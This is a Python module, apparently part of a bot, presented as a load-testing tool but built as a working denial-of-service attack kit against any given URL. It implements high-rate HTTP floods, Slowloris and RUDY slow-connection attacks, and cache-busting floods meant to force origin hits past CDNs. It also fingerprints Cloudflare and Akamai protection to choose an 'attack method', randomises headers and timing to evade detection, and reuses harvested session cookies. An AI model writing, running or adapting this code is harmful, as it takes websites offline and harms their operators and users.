import asyncio
import random
import time
import socket
import struct
from dataclasses import dataclass, field
from urllib.parse import urlparse
import aiohttp

from bot.utils.protection_bypass import (
    get_random_headers,
    detect_protection,
    human_jitter,
)

SLOWLORIS_HEADERS = [
    "X-a: {}\r\n",
    "X-b: {}\r\n",
    "X-c: {}\r\n",
    "Keep-Alive: {}\r\n",
    "X-Forwarded-For: {}.{}.{}.{}\r\n",
]


@dataclass
class StressProfile:
    target_url: str
    duration: int = 60
    concurrency: int = 50
    max_rps: int = 100
    mode: str = "lite"
    method_type: str = "auto"
    methods: list = field(default_factory=lambda: ["GET"])
    timeout: float = 5.0


@dataclass
class TrafficResult:
    total_requests: int = 0
    success: int = 0
    failed: int = 0
    latencies: list = field(default_factory=list)
    status_codes: dict = field(default_factory=dict)
    rps_timeline: list = field(default_factory=list)
    protection_info: dict = field(default_factory=dict)
    elapsed: float = 0.0
    session_cookies_used: int = 0
    error_breakdown: dict = field(default_factory=dict)

    @property
    def rps(self) -> float:
        return round(self.total_requests / self.elapsed, 2) if self.elapsed > 0 else 0

    @property
    def success_rate(self) -> float:
        return round(self.success / self.total_requests * 100, 1) if self.total_requests else 0

    @property
    def p95(self) -> float:
        if not self.latencies:
            return 0
        s = sorted(self.latencies)
        return round(s[int(len(s) * 0.95)], 2)

    @property
    def p99(self) -> float:
        if not self.latencies:
            return 0
        s = sorted(self.latencies)
        return round(s[min(int(len(s) * 0.99), len(s) - 1)], 2)

    @property
    def avg_latency(self) -> float:
        return round(sum(self.latencies) / len(self.latencies), 2) if self.latencies else 0


def _bust_url(url: str) -> str:
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}_={random.randint(1_000_000, 9_999_999)}&cb={random.randint(100, 999)}"


def _random_payload() -> bytes:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    length = random.randint(256, 4096)
    return ("&".join(
        f"{''.join(random.choices(chars, k=random.randint(4,8)))}="
        f"{''.join(random.choices(chars, k=random.randint(8,32)))}"
        for _ in range(random.randint(8, 20))
    )).encode()


def _parse_host_port(url: str) -> tuple[str, int, bool]:
    """Returns (host, port, is_ssl)"""
    if url.startswith("https://"):
        p = urlparse(url)
        return p.hostname, p.port or 443, True
    elif url.startswith("http://"):
        p = urlparse(url)
        return p.hostname, p.port or 80, False
    else:
        p = urlparse("http://" + url)
        return p.hostname or url.split("/")[0], p.port or 80, False


class TrafficWorker:
    def __init__(self, profile: StressProfile):
        self.profile = profile
        self._result = TrafficResult()
        self._stop_event = asyncio.Event()
        self._cookie_pool: list[dict] = []
        self._lock = asyncio.Lock()

    async def _single_request(self, session: aiohttp.ClientSession, protection_checked: list):
        url = _bust_url(self.profile.target_url)
        method = random.choice(self.profile.methods)
        headers = get_random_headers()

        cookies = None
        if self.profile.mode in ("pro", "flood") and self._cookie_pool:
            async with self._lock:
                cookies = random.choice(self._cookie_pool)

        data = None
        if method == "POST":
            data = _random_payload()
            headers["Content-Type"] = random.choice([
                "application/x-www-form-urlencoded",
                "application/json",
                "multipart/form-data",
            ])

        t0 = time.monotonic()
        try:
            kwargs: dict = dict(
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.profile.timeout),
                allow_redirects=True,
                ssl=False,
            )
            if cookies:
                kwargs["cookies"] = cookies
            if data:
                kwargs["data"] = data

            async with session.request(method, url, **kwargs) as resp:
                await resp.read()
                elapsed_ms = (time.monotonic() - t0) * 1000
                ok = resp.status < 500

                async with self._lock:
                    self._result.total_requests += 1
                    self._result.latencies.append(elapsed_ms)
                    key = str(resp.status)
                    self._result.status_codes[key] = self._result.status_codes.get(key, 0) + 1
                    if ok:
                        self._result.success += 1
                    else:
                        self._result.failed += 1

                    if not protection_checked and self.profile.mode in ("pro", "flood"):
                        info = detect_protection(dict(resp.headers))
                        if info.get("detected"):
                            self._result.protection_info = info
                        protection_checked.append(True)

                    if resp.cookies:
                        cookie_dict = {k: v.value for k, v in resp.cookies.items()}
                        if cookie_dict and cookie_dict not in self._cookie_pool:
                            self._cookie_pool.append(cookie_dict)
                            if len(self._cookie_pool) > 50:
                                self._cookie_pool.pop(0)
                            self._result.session_cookies_used += 1

        except asyncio.TimeoutError:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.latencies.append(elapsed_ms)
                self._result.status_codes["timeout"] = self._result.status_codes.get("timeout", 0) + 1
                self._result.error_breakdown["timeout"] = self._result.error_breakdown.get("timeout", 0) + 1
        except Exception as e:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.latencies.append(elapsed_ms)
                err = type(e).__name__
                self._result.status_codes["0"] = self._result.status_codes.get("0", 0) + 1
                self._result.error_breakdown[err] = self._result.error_breakdown.get(err, 0) + 1

    async def _slowloris_worker(self, host: str, port: int, is_ssl: bool):
        """Slowloris: open connections and keep them alive by sending partial HTTP headers."""
        path = urlparse(self.profile.target_url).path or "/"
        while not self._stop_event.is_set():
            t0 = time.monotonic()
            try:
                loop = asyncio.get_event_loop()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)
                await loop.sock_connect(sock, (host, port))

                init = (
                    f"GET {path}?{random.randint(1000,9999)} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {get_random_headers().get('User-Agent', 'Mozilla/5.0')}\r\n"
                    f"Accept-Language: en-US,en;q=0.9\r\n"
                    f"Connection: keep-alive\r\n"
                ).encode()
                await loop.sock_sendall(sock, init)

                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    self._result.success += 1
                    self._result.latencies.append(elapsed_ms)
                    self._result.status_codes["slowloris"] = self._result.status_codes.get("slowloris", 0) + 1

                keep_alive_until = time.monotonic() + random.uniform(10, 30)
                while not self._stop_event.is_set() and time.monotonic() < keep_alive_until:
                    hdr = random.choice(SLOWLORIS_HEADERS).format(
                        random.randint(1, 5000),
                        random.randint(1, 254),
                        random.randint(1, 254),
                        random.randint(1, 254),
                        random.randint(1, 254),
                    )
                    await loop.sock_sendall(sock, hdr.encode())
                    await asyncio.sleep(random.uniform(5, 15))

                sock.close()
            except Exception as e:
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    self._result.failed += 1
                    self._result.latencies.append(elapsed_ms)
                    self._result.error_breakdown["slowloris_err"] = self._result.error_breakdown.get("slowloris_err", 0) + 1

    async def _rudy_worker(self, session: aiohttp.ClientSession):
        """RUDY (aRe yoU Dead Yet): slow POST attack — sends body bytes very slowly."""
        path = urlparse(self.profile.target_url).path or "/"
        host = urlparse(self.profile.target_url).netloc
        t0 = time.monotonic()
        try:
            body_size = random.randint(1024 * 100, 1024 * 500)
            headers = get_random_headers()
            headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(body_size),
                "Connection": "keep-alive",
            })

            async def slow_gen():
                sent = 0
                while sent < body_size and not self._stop_event.is_set():
                    chunk = random.randint(1, 10)
                    yield b"a" * chunk
                    sent += chunk
                    await asyncio.sleep(random.uniform(8, 15))

            async with session.post(
                self.profile.target_url,
                headers=headers,
                data=slow_gen(),
                timeout=aiohttp.ClientTimeout(total=300),
                ssl=False,
            ) as resp:
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    self._result.success += 1
                    self._result.latencies.append(elapsed_ms)
                    self._result.status_codes["rudy"] = self._result.status_codes.get("rudy", 0) + 1

        except Exception:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.latencies.append(elapsed_ms)
                self._result.error_breakdown["rudy_err"] = self._result.error_breakdown.get("rudy_err", 0) + 1

    async def _cache_buster_request(self, session: aiohttp.ClientSession):
        """Cache bypass flood — unique URLs every time to force origin hits."""
        import random, string
        rnd = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        url = f"{self.profile.target_url}?nocache={rnd}&t={int(time.time())}&r={random.random()}"
        headers = get_random_headers()
        headers["Cache-Control"] = "no-cache, no-store"
        headers["Pragma"] = "no-cache"
        headers["If-None-Match"] = f'"{rnd}"'
        t0 = time.monotonic()
        try:
            async with session.get(
                url, headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.profile.timeout),
                ssl=False,
            ) as resp:
                await resp.read()
                elapsed_ms = (time.monotonic() - t0) * 1000
                async with self._lock:
                    self._result.total_requests += 1
                    if resp.status < 500:
                        self._result.success += 1
                    else:
                        self._result.failed += 1
                    self._result.latencies.append(elapsed_ms)
                    key = str(resp.status)
                    self._result.status_codes[key] = self._result.status_codes.get(key, 0) + 1
        except Exception as e:
            elapsed_ms = (time.monotonic() - t0) * 1000
            async with self._lock:
                self._result.total_requests += 1
                self._result.failed += 1
                self._result.latencies.append(elapsed_ms)
                self._result.error_breakdown[type(e).__name__] = self._result.error_breakdown.get(type(e).__name__, 0) + 1

    async def _rps_sampler(self):
        prev = 0
        while not self._stop_event.is_set():
            await asyncio.sleep(1)
            cur = self._result.total_requests
            self._result.rps_timeline.append(cur - prev)
            prev = cur

    async def run(self) -> TrafficResult:
        p = self.profile
        method_type = p.method_type
        start = time.monotonic()
        sampler = asyncio.create_task(self._rps_sampler())
        protection_checked: list = []

        host, port, is_ssl = _parse_host_port(p.target_url)

        connector = aiohttp.TCPConnector(
            limit=p.concurrency,
            ssl=False,
            ttl_dns_cache=300,
            force_close=(p.mode == "flood"),
            enable_cleanup_closed=True,
        )

        async with aiohttp.ClientSession(connector=connector) as session:
            pending: set[asyncio.Task] = set()
            try:
                while time.monotonic() - start < p.duration:
                    if self._stop_event.is_set():
                        break

                    if method_type == "slowloris":
                        if len(pending) < p.concurrency:
                            t = asyncio.create_task(self._slowloris_worker(host, port, is_ssl))
                            pending.add(t)
                            t.add_done_callback(pending.discard)
                        await asyncio.sleep(0.1)

                    elif method_type == "rudy":
                        if len(pending) < min(p.concurrency, 20):
                            t = asyncio.create_task(self._rudy_worker(session))
                            pending.add(t)
                            t.add_done_callback(pending.discard)
                        await asyncio.sleep(0.5)

                    elif method_type == "cache_bust":
                        t = asyncio.create_task(self._cache_buster_request(session))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                        interval = 1.0 / p.max_rps if p.max_rps > 0 else 0.01
                        await asyncio.sleep(interval)

                    elif p.mode == "flood":
                        batch = min(p.concurrency // 5 + 1, 50)
                        for _ in range(batch):
                            t = asyncio.create_task(self._single_request(session, protection_checked))
                            pending.add(t)
                            t.add_done_callback(pending.discard)
                        await asyncio.sleep(0.03)

                    elif p.mode == "pro":
                        t = asyncio.create_task(self._single_request(session, protection_checked))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                        await human_jitter(2, 20)

                    else:
                        interval = 1.0 / p.max_rps if p.max_rps > 0 else 0.01
                        t = asyncio.create_task(self._single_request(session, protection_checked))
                        pending.add(t)
                        t.add_done_callback(pending.discard)
                        await asyncio.sleep(interval)

                if pending:
                    await asyncio.gather(*pending, return_exceptions=True)
            finally:
                self._stop_event.set()
                sampler.cancel()
                try:
                    await sampler
                except asyncio.CancelledError:
                    pass

        self._result.elapsed = time.monotonic() - start
        return self._result


async def run_load_test(profile: StressProfile) -> TrafficResult:
    worker = TrafficWorker(profile)
    return await worker.run()


async def auto_detect_method(target_url: str) -> str:
    """
    Auto-detects the best attack method based on target characteristics.
    Returns method_type string.
    """
    host, port, is_ssl = _parse_host_port(target_url)
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(
                target_url,
                headers=get_random_headers(),
                timeout=aiohttp.ClientTimeout(total=8),
                allow_redirects=True,
                ssl=False,
            ) as resp:
                headers = dict(resp.headers)
                server = headers.get("Server", "").lower()
                via = headers.get("Via", "").lower()
                cf = headers.get("CF-RAY", "")
                akamai = headers.get("X-Check-Cacheable", "")
                powered = headers.get("X-Powered-By", "").lower()
                connection = headers.get("Connection", "").lower()

                if cf or "cloudflare" in server:
                    return "cache_bust"
                if akamai or "akamai" in via:
                    return "cache_bust"
                if "keep-alive" in connection:
                    return "slowloris"
                if "php" in powered or "apache" in server:
                    return "rudy"
                return "http_flood"
    except Exception:
        return "http_flood"


def build_stress_profile(
    target_url: str,
    mode: str = "lite",
    duration: int = 60,
    concurrency: int = 50,
    intensity: str = "medium",
    method_type: str = "auto",
) -> StressProfile:

    if mode == "lite":
        return StressProfile(
            target_url=target_url,
            duration=min(duration, 60),
            concurrency=50,
            max_rps=300,
            mode="lite",
            method_type=method_type if method_type != "auto" else "http_flood",
            methods=["GET", "HEAD"],
            timeout=6.0,
        )

    if mode == "flood":
        rps_map = {"low": 1000, "medium": 2500, "high": 5000, "ultra": 8000}
        conc_map = {"low": 300, "medium": 700, "high": 1500, "ultra": 3000}
        return StressProfile(
            target_url=target_url,
            duration=min(duration, 300),
            concurrency=conc_map.get(intensity, 700),
            max_rps=rps_map.get(intensity, 2500),
            mode="flood",
            method_type=method_type,
            methods=["GET", "POST", "HEAD", "OPTIONS"],
            timeout=2.0,
        )

    rps_map = {"low": 500, "medium": 1200, "high": 2500, "ultra": 5000}
    conc_map = {"low": 150, "medium": 400, "high": 800, "ultra": 1500}
    return StressProfile(
        target_url=target_url,
        duration=duration,
        concurrency=conc_map.get(intensity, 400),
        max_rps=rps_map.get(intensity, 1200),
        mode="pro",
        method_type=method_type,
        methods=["GET", "POST", "HEAD"],
        timeout=4.0,
    )
